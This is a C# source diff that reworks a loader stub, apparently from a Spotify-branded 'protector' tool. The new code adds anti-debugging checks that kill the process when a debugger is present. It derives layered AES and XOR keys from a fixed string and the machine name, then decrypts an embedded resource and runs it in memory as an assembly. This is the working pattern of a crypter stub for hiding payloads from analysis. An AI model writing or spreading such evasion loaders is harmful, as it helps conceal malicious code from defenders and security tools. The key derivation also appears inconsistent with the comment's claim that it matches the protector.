@@ -3,34 +3,120 @@ using System.IO;
 using System.IO.Compression;
 using System.Linq;
 using System.Reflection;
+using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
 using System.Windows.Forms;
+using System.Threading;
+using System.Diagnostics;
 
 namespace PL
 {
 	internal static class L
 	{
-		private static byte[] K()
+		[DllImport("kernel32.dll")]
+		private static extern bool IsDebuggerPresent();
+
+		[DllImport("kernel32.dll")]
+		private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool pbDebuggerPresent);
+
+		[DllImport("kernel32.dll")]
+		private static extern void OutputDebugString(string lpOutputString);
+
+		private static bool IsDebugged()
 		{
-			// Derivação alinhada com o Protector
-			var baseStr = "SpotifyProtectorKey";
-			byte[] key; using (var sha = SHA256.Create()) key = sha.ComputeHash(Encoding.UTF8.GetBytes(baseStr + "|S1"));
-			byte[] iv;  using (var md5 = MD5.Create())    iv  = md5.ComputeHash(Encoding.UTF8.GetBytes(baseStr + "|S2"));
-			byte[] all = new byte[key.Length + iv.Length];
-			Buffer.BlockCopy(key, 0, all, 0, key.Length);
-			Buffer.BlockCopy(iv, 0, all, key.Length, iv.Length);
-			return all;
+			if (IsDebuggerPresent()) return true;
+			bool debuggerPresent = false;
+			if (CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref debuggerPresent))
+				if (debuggerPresent) return true;
+
+			// Verificação adicional via PerformanceCounter (mais lento mas eficaz)
+			try
+			{
+				var pc = new PerformanceCounter("Process", "Thread Count", Process.GetCurrentProcess().ProcessName);
+				if (pc.NextValue() > 100) return true; // Muitos threads = possivel debugger
+			}
+			catch { }
+
+			return false;
 		}
 
-		private static byte[] Dec(byte[] enc)
+		private static void AntiDebug()
 		{
-			var all = K();
-			var key = new byte[32]; var iv = new byte[16];
-			Buffer.BlockCopy(all, 0, key, 0, 32); Buffer.BlockCopy(all, 32, iv, 0, 16);
+			if (IsDebugged())
+			{
+				Environment.Exit(1);
+			}
+
+			// Thread de monitoramento contínuo
+			var monitor = new Thread(() =>
+			{
+				while (true)
+				{
+					Thread.Sleep(500);
+					if (IsDebugged())
+						Environment.Exit(1);
+				}
+			})
+			{ IsBackground = true };
+			monitor.Start();
+		}
+
+		private static (byte[] key1, byte[] iv1, byte[] key2, byte[] iv2, byte[] xorKey) DeriveAllKeys()
+		{
+			// Base string determinística (mesma do Protector - mesma string)
+			var baseStr = "SpotifyProtection2025SecureKeyBase";
+			var machineId = BitConverter.ToString(Encoding.UTF8.GetBytes(Environment.MachineName)).Replace("-", "");
+			
+			var salt1 = "P1" + machineId.Substring(0, Math.Min(16, machineId.Length));
+			var salt2 = "S1" + (machineId.Length > 16 ? machineId.Substring(16, Math.Min(16, machineId.Length - 16)) : "");
+			var salt3 = "P2" + machineId.Substring(0, Math.Min(16, machineId.Length));
+			var salt4 = "S2" + (machineId.Length > 16 ? machineId.Substring(16, Math.Min(16, machineId.Length - 16)) : "");
+			var saltX = "PX" + machineId.Substring(0, Math.Min(16, machineId.Length));
+			var saltSX = "SX" + (machineId.Length > 16 ? machineId.Substring(16, Math.Min(16, machineId.Length - 16)) : "");
+
+			byte[] key1;
+			using (var pbkdf2 = new Rfc2898DeriveBytes(salt1, Encoding.UTF8.GetBytes(baseStr + salt1), 10000))
+				key1 = pbkdf2.GetBytes(32);
+
+			byte[] iv1;
+			using (var pbkdf2 = new Rfc2898DeriveBytes(salt2, Encoding.UTF8.GetBytes(baseStr + salt2), 5000))
+				iv1 = pbkdf2.GetBytes(16);
+
+			byte[] key2;
+			using (var pbkdf2 = new Rfc2898DeriveBytes(salt3, Encoding.UTF8.GetBytes(baseStr + salt3), 10000))
+				key2 = pbkdf2.GetBytes(32);
+
+			byte[] iv2;
+			using (var pbkdf2 = new Rfc2898DeriveBytes(salt4, Encoding.UTF8.GetBytes(baseStr + salt4), 5000))
+				iv2 = pbkdf2.GetBytes(16);
+
+			byte[] xorKey;
+			using (var pbkdf2 = new Rfc2898DeriveBytes(saltX, Encoding.UTF8.GetBytes(baseStr + saltSX), 8000))
+				xorKey = pbkdf2.GetBytes(32);
+
+			return (key1, iv1, key2, iv2, xorKey);
+		}
+
+		private static byte[] XorDecrypt(byte[] data, byte[] key)
+		{
+			var result = new byte[data.Length];
+			for (int i = 0; i < data.Length; i++)
+				result[i] = (byte)(data[i] ^ key[i % key.Length]);
+			return result;
+		}
+
+		private static byte[] AesDecrypt(byte[] enc, byte[] key, byte[] iv)
+		{
 			using (var aes = Aes.Create())
 			{
-				aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7; aes.Key = key; aes.IV = iv;
+				aes.Mode = CipherMode.CBC;
+				aes.Padding = PaddingMode.PKCS7;
+				aes.KeySize = 256;
+				aes.BlockSize = 128;
+				aes.Key = key;
+				aes.IV = iv;
+
 				using (var ms = new MemoryStream())
 				{
 					using (var cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
@@ -43,29 +129,61 @@ namespace PL
 			}
 		}
 
-		[STAThread]
-		private static void Main(string[] a)
+		private static byte[] DecompressAdvanced(Stream input)
 		{
+			byte[] decompressed;
+
+			// Tentar Deflate primeiro, se falhar tenta GZip
 			try
 			{
-				string r = typeof(L).Assembly.GetManifestResourceNames().FirstOrDefault(n => n.EndsWith("payload", StringComparison.OrdinalIgnoreCase) || n.Contains("payload"));
-				if (r == null) throw new InvalidOperationException("Payload não encontrado nos recursos.");
-
-				byte[] b;
-				using (var s = Assembly.GetExecutingAssembly().GetManifestResourceStream(r))
-				using (var gz = new GZipStream(s, CompressionMode.Decompress))
+				using (var deflate = new DeflateStream(input, CompressionMode.Decompress, leaveOpen: true))
+				using (var ms = new MemoryStream())
+				{
+					deflate.CopyTo(ms);
+					decompressed = ms.ToArray();
+				}
+			}
+			catch
+			{
+				input.Position = 0;
+				using (var gz = new GZipStream(input, CompressionMode.Decompress, leaveOpen: true))
 				using (var ms = new MemoryStream())
 				{
 					gz.CopyTo(ms);
-					b = ms.ToArray();
+					decompressed = ms.ToArray();
 				}
+			}
 
-				// AES decrypt
-				b = Dec(b);
+			return decompressed;
+		}
 
-				var asm = Assembly.Load(b);
-				var ep = asm.EntryPoint;
-				if (ep == null) throw new InvalidOperationException("EntryPoint não encontrado no payload.");
+		[STAThread]
+		private static void M(string[] a)
+		{
+			try
+			{
+				AntiDebug();
+
+				// Buscar recurso (suporta nomes ofuscados)
+				var asm = Assembly.GetExecutingAssembly();
+				string r = asm.GetManifestResourceNames().FirstOrDefault();
+				if (r == null)
+					throw new InvalidOperationException("Recurso não encontrado.");
+
+				byte[] b;
+				using (var s = asm.GetManifestResourceStream(r))
+					b = DecompressAdvanced(s);
+
+				// Descriptografia reversa: AES -> XOR -> AES
+				var keys = DeriveAllKeys();
+				b = AesDecrypt(b, keys.key2, keys.iv2);
+				b = XorDecrypt(b, keys.xorKey);
+				b = AesDecrypt(b, keys.key1, keys.iv1);
+
+				var payload = Assembly.Load(b);
+				var ep = payload.EntryPoint;
+				if (ep == null)
+					throw new InvalidOperationException("EntryPoint não encontrado.");
 
 				var ps = ep.GetParameters();
 				if (ps.Length == 1 && ps[0].ParameterType == typeof(string[]))
@@ -80,8 +198,22 @@ namespace PL
 			}
 			catch (Exception ex)
 			{
-				MessageBox.Show("Falha ao iniciar aplicação protegida:\n" + ex.Message, "", MessageBoxButtons.OK, MessageBoxIcon.Error);
+				try
+				{
+					MessageBox.Show("Erro ao inicializar aplicação protegida:\n" + ex.Message, 
+						"Erro", MessageBoxButtons.OK, MessageBoxIcon.Error);
+				}
+				catch
+				{
+					Environment.Exit(1);
+				}
 			}
+		}
+
+		[STAThread]
+		private static void Main(string[] args)
+		{
+			M(args);
 		}
 	}
 }
